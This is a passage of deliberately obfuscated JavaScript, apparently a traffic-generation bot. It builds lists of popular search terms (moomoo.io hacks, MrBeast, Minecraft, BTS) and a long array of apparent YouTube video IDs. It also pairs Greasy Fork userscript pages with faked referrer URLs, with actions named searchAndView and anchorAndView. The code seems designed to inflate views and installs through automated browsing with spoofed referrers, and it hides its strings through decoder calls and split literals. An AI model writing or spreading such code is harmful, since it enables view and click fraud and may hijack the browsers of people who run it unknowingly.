searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + a1(0x1e) + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + a3(0x0) + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + a1(0x1a) + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x1 * 0x6fd + 0x23b + -0x4 * -0x133)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x72c + -0x1a3e + -0x2 * -0x10ba)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x2561 * -0x1 + 0x744 * -0x5 + 0x49b8);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    a2(0x15, 'Tm0g') + 's',
    'JsKZ41uTeg' + 'c',
    a2(0x1, '9Pn#') + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    a1(0x8) + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    a2(0x23, 'BzCK') + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    a2(0x1f, 'tmEQ') + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + a3(0xf)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': a3(0x22) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + a1(0x7) + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + a1(0x4)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + a1(0x4)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + a1(0xa) + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': a3(0x22) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': a3(0x22) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
